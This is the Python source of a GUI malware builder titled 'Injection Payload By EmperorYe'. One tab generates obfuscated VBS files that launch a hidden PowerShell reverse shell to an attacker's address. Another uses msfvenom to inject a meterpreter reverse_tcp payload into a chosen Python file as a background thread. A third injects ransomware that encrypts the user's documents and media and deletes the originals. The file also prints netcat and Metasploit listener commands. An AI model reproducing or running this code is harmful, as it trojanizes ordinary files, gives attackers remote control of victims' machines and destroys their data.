import os
import random
import string
import subprocess
import re
import base64
import threading
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext
from PIL import Image, ImageTk
from time import sleep

class InjectionPayloadGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Injection Payload By EmperorYe")
        self.root.geometry("900x700")
        self.root.resizable(False, False)
        self.root.configure(bg='#2c3e50')
        
        self.setup_styles()
        self.create_main_container()
        self.create_banner()
        self.create_control_panel()
        self.create_output_panel()
    
    def setup_styles(self):
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        self.style.configure('TFrame', background='#34495e')
        self.style.configure('TNotebook', background='#34495e', borderwidth=0)
        self.style.configure('TNotebook.Tab', background='#2c3e50', foreground='white', 
                           padding=[10,5], font=('Arial', 10, 'bold'))
        self.style.map('TNotebook.Tab', background=[('selected', '#3498db')])
        
        self.style.configure('TButton', font=('Arial', 10), padding=5, 
                           background='#3498db', foreground='white')
        self.style.map('TButton', background=[('active', '#2980b9')])
        
        self.style.configure('TLabel', background='#34495e', foreground='white', 
                           font=('Arial', 10))
        self.style.configure('TRadiobutton', background='#34495e', foreground='white')
        self.style.configure('TEntry', fieldbackground='#ecf0f1')
    
    def create_main_container(self):
        self.main_container = ttk.Frame(self.root)
        self.main_container.pack(fill='both', expand=True, padx=10, pady=10)
    
    def create_banner(self):
        banner_frame = ttk.Frame(self.main_container, style='TFrame')
        banner_frame.pack(fill='x', pady=(0,10))
        
        try:
            banner_img = Image.open("banner.jpg")
            banner_img = banner_img.resize((880, 120), Image.LANCZOS)
            self.banner_photo = ImageTk.PhotoImage(banner_img)
            
            banner_label = ttk.Label(banner_frame, image=self.banner_photo)
            banner_label.pack()
        except:
            banner_label = ttk.Label(banner_frame, 
                                    text="INJECTION PAYLOAD SCRIPT", 
                                    font=('Arial', 18, 'bold'), 
                                    foreground='white', 
                                    background='#3498db',
                                    anchor='center')
            banner_label.pack(fill='both', ipady=15)
    
    def create_control_panel(self):
        control_frame = ttk.Frame(self.main_container, style='TFrame')
        control_frame.pack(fill='both', expand=True, pady=(0,10))
        
        notebook = ttk.Notebook(control_frame)
        notebook.pack(fill='both', expand=True)
        
        self.create_netcat_tab(notebook)
        self.create_metasploit_tab(notebook)
        self.create_ransomware_tab(notebook)
        
        self.animate_notebook(notebook)
    
    def animate_notebook(self, notebook):
        colors = ['#3498db', '#2ecc71', '#e74c3c']
        for i, color in enumerate(colors):
            self.root.after(100*i, lambda c=color: self.style.map('TNotebook.Tab', 
                background=[('selected', c)]))
    
    def create_output_panel(self):
        output_frame = ttk.Frame(self.main_container, style='TFrame')
        output_frame.pack(fill='x')
        
        self.output_text = scrolledtext.ScrolledText(output_frame, 
                                                   height=10, 
                                                   width=100, 
                                                   font=('Consolas', 9),
                                                   bg='#2c3e50',
                                                   fg='white',
                                                   insertbackground='white')
        self.output_text.pack(fill='both')
        self.output_text.config(state='disabled')
    
    def create_netcat_tab(self, notebook):
        tab = ttk.Frame(notebook, style='TFrame')
        notebook.add(tab, text='Reverse Shell VBS')
        
        form_frame = ttk.Frame(tab, style='TFrame')
        form_frame.pack(fill='both', expand=True, padx=20, pady=20)
        
        ttk.Label(form_frame, text="Target IP/Domain:").grid(row=0, column=0, sticky='e', padx=5, pady=10)
        self.ip_entry = ttk.Entry(form_frame, width=35)
        self.ip_entry.grid(row=0, column=1, sticky='w', padx=5, pady=10)
        
        ttk.Label(form_frame, text="Listener Port:").grid(row=1, column=0, sticky='e', padx=5, pady=10)
        self.port_entry = ttk.Entry(form_frame, width=35)
        self.port_entry.grid(row=1, column=1, sticky='w', padx=5, pady=10)
        
        ttk.Label(form_frame, text="Output Filename:").grid(row=2, column=0, sticky='e', padx=5, pady=10)
        self.filename_entry = ttk.Entry(form_frame, width=35)
        self.filename_entry.grid(row=2, column=1, sticky='w', padx=5, pady=10)
        
        method_frame = ttk.Frame(form_frame, style='TFrame')
        method_frame.grid(row=3, column=0, columnspan=2, pady=15)
        
        self.method_var = tk.StringVar(value="1")
        ttk.Radiobutton(method_frame, text="Obfuscation Chr()", variable=self.method_var, value="1").pack(side='left', padx=15)
        ttk.Radiobutton(method_frame, text="Base64 UTF-16LE", variable=self.method_var, value="2").pack(side='left', padx=15)
        
        button_frame = ttk.Frame(form_frame, style='TFrame')
        button_frame.grid(row=4, column=0, columnspan=2, pady=10)
        
        gen_btn = ttk.Button(button_frame, text="Generate Payload", command=self.generate_vbs)
        gen_btn.pack(side='left', padx=5)
        self.add_button_animation(gen_btn)
    
    def create_metasploit_tab(self, notebook):
        tab = ttk.Frame(notebook, style='TFrame')
        notebook.add(tab, text='Metasploit Injector')
        
        form_frame = ttk.Frame(tab, style='TFrame')
        form_frame.pack(fill='both', expand=True, padx=20, pady=20)
        
        ttk.Label(form_frame, text="Python Target File:").grid(row=0, column=0, sticky='e', padx=5, pady=10)
        self.py_file_entry = ttk.Entry(form_frame, width=35)
        self.py_file_entry.grid(row=0, column=1, sticky='w', padx=5, pady=10)
        browse_btn = ttk.Button(form_frame, text="Browse", command=lambda: self.browse_file(self.py_file_entry))
        browse_btn.grid(row=0, column=2, padx=5)
        self.add_button_animation(browse_btn)
        
        ttk.Label(form_frame, text="LHOST (IP/ngrok):").grid(row=1, column=0, sticky='e', padx=5, pady=10)
        self.lhost_entry = ttk.Entry(form_frame, width=35)
        self.lhost_entry.grid(row=1, column=1, sticky='w', padx=5, pady=10)
        
        ttk.Label(form_frame, text="LPORT:").grid(row=2, column=0, sticky='e', padx=5, pady=10)
        self.lport_entry = ttk.Entry(form_frame, width=35)
        self.lport_entry.grid(row=2, column=1, sticky='w', padx=5, pady=10)
        
        button_frame = ttk.Frame(form_frame, style='TFrame')
        button_frame.grid(row=3, column=0, columnspan=3, pady=15)
        
        inject_btn = ttk.Button(button_frame, text="Inject Payload", command=self.inject_metasploit)
        inject_btn.pack(side='left', padx=5)
        self.add_button_animation(inject_btn)
    
    def create_ransomware_tab(self, notebook):
        tab = ttk.Frame(notebook, style='TFrame')
        notebook.add(tab, text='Ransomware Injector')
        
        form_frame = ttk.Frame(tab, style='TFrame')
        form_frame.pack(fill='both', expand=True, padx=20, pady=20)
        
        warning_label = ttk.Label(form_frame, 
                                text="WARNING: Output will encrypt user documents!", 
                                foreground='red', 
                                font=('Arial', 10, 'bold'),
                                background='#34495e')
        warning_label.grid(row=0, column=0, columnspan=3, pady=(0,15))
        
        ttk.Label(form_frame, text="Python Target File:").grid(row=1, column=0, sticky='e', padx=5, pady=10)
        self.ransom_file_entry = ttk.Entry(form_frame, width=35)
        self.ransom_file_entry.grid(row=1, column=1, sticky='w', padx=5, pady=10)
        browse_btn = ttk.Button(form_frame, text="Browse", command=lambda: self.browse_file(self.ransom_file_entry))
        browse_btn.grid(row=1, column=2, padx=5)
        self.add_button_animation(browse_btn)
        
        button_frame = ttk.Frame(form_frame, style='TFrame')
        button_frame.grid(row=2, column=0, columnspan=3, pady=15)
        
        inject_btn = ttk.Button(button_frame, text="Inject Payload", command=self.inject_ransomware)
        inject_btn.pack(side='left', padx=5)
        self.add_button_animation(inject_btn)
    
    def add_button_animation(self, button):
        def on_enter(e):
            button['style'] = 'TButton'
            self.root.after(50, lambda: button.configure(style='TButton'))
        
        def on_leave(e):
            button['style'] = 'TButton'
        
        button.bind("<Enter>", on_enter)
        button.bind("<Leave>", on_leave)
    
    def clear_output(self):
        self.output_text.config(state='normal')
        self.output_text.delete(1.0, tk.END)
        self.output_text.config(state='disabled')
    
    def append_output(self, text, color='white'):
        self.output_text.config(state='normal')
        self.output_text.tag_config(color, foreground=color)
        self.output_text.insert(tk.END, text + "\n", color)
        self.output_text.see(tk.END)
        self.output_text.config(state='disabled')
        self.root.update()
    
    def browse_file(self, entry_widget):
        filename = filedialog.askopenfilename(filetypes=[("Python files", "*.py")])
        if filename:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, filename)
            self.append_output(f"Selected file: {filename}", "#2ecc71")
    
    def random_var(self, length=8):
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def validate_ip_or_domain(self, value):
        ip_pattern = r"^\d{1,3}(\.\d{1,3}){3}$"
        domain_pattern = r"^(?!-)([a-zA-Z0-9-]{1,63}\.)+[a-zA-Z]{2,}$"
        return re.match(ip_pattern, value) or re.match(domain_pattern, value)
    
    def validate_port(self, port):
        return port.isdigit() and 1 <= int(port) <= 65535
    
    def powershell_reverse_shell(self, ip, port):
        return (
            f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            "$stream = $client.GetStream();"
            "$writer = New-Object System.IO.StreamWriter($stream);"
            "$buffer = New-Object System.Byte[] 1024;"
            "$encoding = New-Object System.Text.ASCIIEncoding;"
            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){"
            "$command = $encoding.GetString($buffer, 0, $read);"
            "$output = cmd.exe /c $command 2>&1 | Out-String;"
            "$writer.WriteLine($output);"
            "$writer.Flush()"
            "}"
        )
    
    def obfuscate_chr(self, text):
        return '""' + ''.join([f' & Chr({ord(c)})' for c in text])
    
    def metode_chr(self, ip, port, filename_vbs):
        try:
            payload = self.powershell_reverse_shell(ip, port)
            pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)'
            obf_payload = self.obfuscate_chr(payload)
            vbs = (
                'Set x = CreateObject("WScript.Shell")\n'
                f'x.Run {pwsh} & " -NoP -NonI -W Hidden -Command " & {obf_payload}, 0, False\n'
            )
            with open(filename_vbs, "w", newline="\r\n") as f:
                f.write(vbs)
            return True
        except Exception as e:
            self.append_output(f"Error in Chr() method: {str(e)}", "#e74c3c")
            return False
    
    def metode_b64(self, ip, port, filename_vbs):
        try:
            payload = self.powershell_reverse_shell(ip, port)
            encoded = base64.b64encode(payload.encode("utf-16le")).decode()
            vbs = (
                'Set shell = CreateObject("Wscript.Shell")\n'
                f'shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded}", 0, False\n'
            )
            with open(filename_vbs, 'w', newline='\r\n') as f:
                f.write(vbs)
            return True
        except Exception as e:
            self.append_output(f"Error in Base64 method: {str(e)}", "#e74c3c")
            return False
    
    def generate_vbs(self):
        ip = self.ip_entry.get().strip()
        port = self.port_entry.get().strip()
        filename = self.filename_entry.get().strip()
        method = self.method_var.get()
        
        self.clear_output()
        
        if not ip or not port:
            self.append_output("Error: IP and Port cannot be empty", "#e74c3c")
            return
        
        if not self.validate_ip_or_domain(ip):
            self.append_output("Error: Invalid IP/Domain format", "#e74c3c")
            return
            
        if not self.validate_port(port):
            self.append_output("Error: Port must be between 1-65535", "#e74c3c")
            return
            
        if not filename:
            filename = self.random_var() + "_nc.vbs"
        elif not filename.endswith('.vbs'):
            filename += '.vbs'
        
        try:
            self.append_output("Starting payload generation...", "#3498db")
            
            success = False
            if method == "1":
                self.append_output("Using Chr() obfuscation method...", "#3498db")
                success = self.metode_chr(ip, port, filename)
            elif method == "2":
                self.append_output("Using Base64 encoding method...", "#3498db")
                success = self.metode_b64(ip, port, filename)
            
            if success:
                self.append_output(f"Success: VBS file created at {os.path.abspath(filename)}", "#2ecc71")
                self.append_output(f"Run listener: nc -lnvp {port}", "#3498db")
        except Exception as e:
            self.append_output(f"Critical Error: {str(e)}", "#e74c3c")
    
    def inject_metasploit(self):
        py_file = self.py_file_entry.get().strip()
        lhost = self.lhost_entry.get().strip()
        lport = self.lport_entry.get().strip()
        
        self.clear_output()
        
        if not py_file or not lhost or not lport:
            self.append_output("Error: All fields must be filled", "#e74c3c")
            return
            
        if not os.path.isfile(py_file):
            self.append_output(f"Error: File not found - {py_file}", "#e74c3c")
            return
            
        if not self.validate_ip_or_domain(lhost):
            self.append_output("Error: Invalid LHOST format", "#e74c3c")
            return
            
        if not self.validate_port(lport):
            self.append_output("Error: LPORT must be between 1-65535", "#e74c3c")
            return
        
        try:
            self.append_output(f"Creating Metasploit payload for {lhost}:{lport}...", "#3498db")
            result = subprocess.run(
                ["msfvenom", "-p", "python/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            if result.returncode != 0:
                self.append_output("Payload creation failed", "#e74c3c")
                self.append_output(result.stderr, "#e74c3c")
                return
            
            msf_payload = result.stdout.strip().splitlines()
            with open(py_file, "r", encoding="utf-8") as f:
                original = f.read()
            
            fn_name = self.random_var()
            payload_func = [f"def {fn_name}():\n"]
            for line in msf_payload:
                payload_func.append(f"    {line}\n")
            payload_func.append(f"\nthreading.Thread(target={fn_name}, daemon=True).start()\n\n")
            
            final_code = "import threading\n" + ''.join(payload_func) + original
            
            output_file = py_file.replace(".py", "_patched.py")
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(final_code)
            
            self.append_output(f"Success: Payload injected to {output_file}", "#2ecc71")
            self.append_output(f"Run listener: msfconsole -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit\"", "#3498db")
        except Exception as e:
            self.append_output(f"Injection failed: {str(e)}", "#e74c3c")
    
    def inject_ransomware(self):
        py_file = self.ransom_file_entry.get().strip()
        
        self.clear_output()
        
        if not py_file:
            self.append_output("Error: Target file must be specified", "#e74c3c")
            return
            
        if not os.path.isfile(py_file):
            self.append_output(f"Error: File not found - {py_file}", "#e74c3c")
            return
        
        try:
            self.append_output("Injecting ransomware payload...", "#3498db")
            
            with open(py_file, 'r', encoding='utf-8') as f:
                original = f.read()
            
            fn_name = self.random_var()
            ransomware_code = f'''
import threading
def {fn_name}():
    from Crypto.Cipher import AES, PKCS1_OAEP
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad
    import os

    public_key = b\"\"\"-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnFakeExampleKeyHere
-----END PUBLIC KEY-----\"\"\"
    rsa_key = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(rsa_key)

    def encrypt_file(filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            aes_key = get_random_bytes(32)
            cipher_aes = AES.new(aes_key, AES.MODE_CBC)
            ciphertext = cipher_aes.encrypt(pad(data, AES.block_size))
            enc_key = cipher_rsa.encrypt(aes_key)
            with open(filepath + '.locked', 'wb') as f:
                f.write(enc_key + cipher_aes.iv + ciphertext)
            os.remove(filepath)
        except: pass

    EXT = ['.txt','.docx','.xls','.pdf','.jpg','.ico','.png','.mp4','.mp3']
    for root, _, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if any(file.endswith(ext) for ext in EXT):
                encrypt_file(os.path.join(root, file))

threading.Thread(target={fn_name}, daemon=True).start()

'''
            output_file = py_file.replace(".py", "_patched.py")
            with open(output_file, "w", encoding='utf-8') as f:
                f.write(ransomware_code + '\n' + original)
            
            self.append_output(f"Success: Ransomware payload injected to {output_file}", "#2ecc71")
            self.append_output("WARNING: Use with caution - will encrypt user documents!", "#e74c3c")
        except Exception as e:
            self.append_output(f"Injection failed: {str(e)}", "#e74c3c")

if __name__ == "__main__":
    root = tk.Tk()
    app = InjectionPayloadGUI(root)
    root.mainloop()
